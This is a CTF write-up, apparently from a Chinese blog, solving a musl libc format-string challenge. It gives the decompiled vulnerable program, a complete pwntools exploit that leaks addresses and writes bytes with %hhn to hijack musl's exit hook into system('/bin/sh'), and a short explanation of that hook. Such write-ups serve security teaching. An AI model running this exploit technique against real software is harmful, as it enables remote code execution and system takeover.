<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-110h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_0<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">do</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"quit"</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>musl libc中没有glibc里 %10$n这样的位置描述符，所以在不使用位置描述符的情况下去实现任意地址读写的原语，可以填充大量的%c去替代idx来实现任意地址读写的</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./format-muscle'</span><span class="token punctuation">)</span>
<span class="token comment"># libc = elf.libc</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>



p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

gdb_comm <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
b *$rebase(0x11F5)
c
'''</span>


<span class="token keyword">def</span> <span class="token function">write_byte</span><span class="token punctuation">(</span>byte<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span><span class="token string">b'%c%c%c%c'</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'.%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte <span class="token operator">+</span> <span class="token number">248</span><span class="token punctuation">&#125;</span></span><span class="token string">c%c'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%c%c%hhn'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">write_qword</span><span class="token punctuation">(</span>qword<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        write_byte<span class="token punctuation">(</span><span class="token punctuation">(</span>qword <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> addr <span class="token operator">+</span> i<span class="token punctuation">)</span>


<span class="token comment"># -stack-libc</span>
payload <span class="token operator">=</span> <span class="token string">b'%p'</span> <span class="token operator">*</span> <span class="token number">34</span> <span class="token operator">+</span> <span class="token string">b'-%p'</span>
payload <span class="token operator">+=</span> <span class="token string">b'%p'</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token string">b'-%p'</span>

sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x75fb9b010560</span> <span class="token operator">-</span> <span class="token number">0x75fb9af61000</span><span class="token punctuation">)</span>
rbp <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffe2b6f52c8</span> <span class="token operator">-</span> <span class="token number">0x7ffe2b6f5280</span><span class="token punctuation">)</span>
input_addr <span class="token operator">=</span> rbp <span class="token operator">-</span> <span class="token number">0x110</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token punctuation">)</span>


system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000152a1</span>
ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000019e9c</span>

payload <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">255</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># clean up buf</span>

payload <span class="token operator">=</span> <span class="token string">b'%p'</span> <span class="token operator">*</span> <span class="token number">46</span> <span class="token operator">+</span> <span class="token string">b'-%p'</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
elf_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x61b7c38d50a6</span> <span class="token operator">-</span> <span class="token number">0x61b7c38d4000</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">255</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># clean up buf</span>

struct_fl_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xafc48</span>
fake_struct_fl_addr <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x4200</span>

write_qword<span class="token punctuation">(</span>fake_struct_fl_addr<span class="token punctuation">,</span> struct_fl_addr<span class="token punctuation">)</span>
write_qword<span class="token punctuation">(</span>fake_struct_fl_addr<span class="token punctuation">,</span> fake_struct_fl_addr<span class="token punctuation">)</span>
write_qword<span class="token punctuation">(</span>system<span class="token punctuation">,</span> fake_struct_fl_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
write_qword<span class="token punctuation">(</span>binsh<span class="token punctuation">,</span> fake_struct_fl_addr <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span>


<span class="token comment"># g(p)</span>
sl<span class="token punctuation">(</span><span class="token string">"quit"</span><span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>musl libc中的exit hook，在exit的一个子函数中有一个函数指针的调用的操作，这个函数指针和参数都在ld的数据段上，所以如果能实现任意地址写同时能触发exit就能通过exit hook去getshell</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">exit</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">sub_1B880</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_75E10</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_5A100</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">Exit</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">sub_1B880</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  _QWORD <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// r12</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rbp</span>
  bool v5<span class="token punctuation">;</span> <span class="token comment">// cc</span>

  result <span class="token operator">=</span> <span class="token function">sub_68D30</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_AFE60<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_AFC48<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_AFC48 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v2 <span class="token operator">=</span> dword_AFE64<span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">--</span>dword_AFE64<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token keyword">goto</span> LABEL_4<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">do</span>
      <span class="token punctuation">&#123;</span>
        v3 <span class="token operator">=</span> v1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">+</span> <span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">)</span>v1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">sub_68E20</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_AFE60<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">v4</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sub_68D30</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_AFE60<span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>dword_AFE64 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v5 <span class="token operator">=</span> dword_AFE64 <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        v1 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_AFC48<span class="token punctuation">;</span>
        <span class="token operator">--</span>dword_AFE64<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v5 <span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_4<span class="token operator">:</span>
      dword_AFE64 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
      v1 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>v1<span class="token punctuation">;</span>
      qword_AFC48 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v1<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v1 <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      dword_AFE64 <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span>
      <span class="token function">LODWORD</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/08/25/羊城杯2023部分题目复现/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/08/08/tfcctf2024/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-08-22 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>57</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
